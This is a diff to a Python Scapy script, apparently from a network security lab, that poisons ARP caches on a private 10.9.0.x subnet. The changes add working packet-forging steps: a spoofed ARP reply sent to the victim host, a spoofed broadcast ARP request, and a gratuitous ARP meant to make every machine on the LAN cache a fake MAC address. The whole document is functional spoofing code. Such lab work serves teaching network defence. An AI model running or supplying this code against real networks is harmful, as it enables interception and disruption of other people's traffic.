@@ -7,7 +7,6 @@ from scapy.all import Ether, ARP, sendp, send
 # A_IP = bytes('10.9.0.5')
 A_IP = '10.9.0.5'
 B_IP = '10.9.0.6'
-M_IP = '10.9.0.1'
 F_IP = '10.9.0.99'
 A_MAC = "02:42:0a:09:00:05"
 B_MAC = "02:42:0a:09:00:06"
@@ -17,18 +16,26 @@ broadcast_MAC = "ff:ff:ff:ff:ff:ff"
 target_IP = A_IP
 target_MAC = A_MAC
 
-# spoof arp packet
+# spoof arp reply that victim caches fake MAC from reply of attacker
 ether = Ether(dst=A_MAC, src=F_MAC)
-arp = ARP(hwsrc=F_MAC, psrc=B_IP, pdst=A_IP)
+arp = ARP(hwsrc=F_MAC, psrc=F_IP, pdst=A_IP)
+arp.op = 2 # arp reply
+pkt = ether/arp
+pkt.show()
+sendp(pkt)
+
+# spoof arp request that let victim cache fake MAC from broadcast packet
+ether = Ether(dst=broadcast_MAC, src=F_MAC)
+arp = ARP(hwsrc=F_MAC, psrc=F_IP, pdst=A_IP)
 arp.op = 1 # arp request
 pkt = ether/arp
 pkt.show()
 sendp(pkt)
 
-# # spoof gratuitous message
-# ether = Ether(dst=broadcast_MAC, src=F_MAC)
-# arp = ARP(hwsrc=F_MAC, psrc=F_IP, pdst=F_IP)
-# arp.op = 2 # arp reply
-# pkt = ether/arp
-# pkt.show()
-# send(pkt)
+# spoof gratuitous message that all machines in LAN will cache fake MAC
+ether = Ether(dst=broadcast_MAC, src=F_MAC)
+arp = ARP(hwsrc=F_MAC, psrc=F_IP, pdst=F_IP)
+arp.op = 2 # arp reply
+pkt = ether/arp
+pkt.show()
+send(pkt)
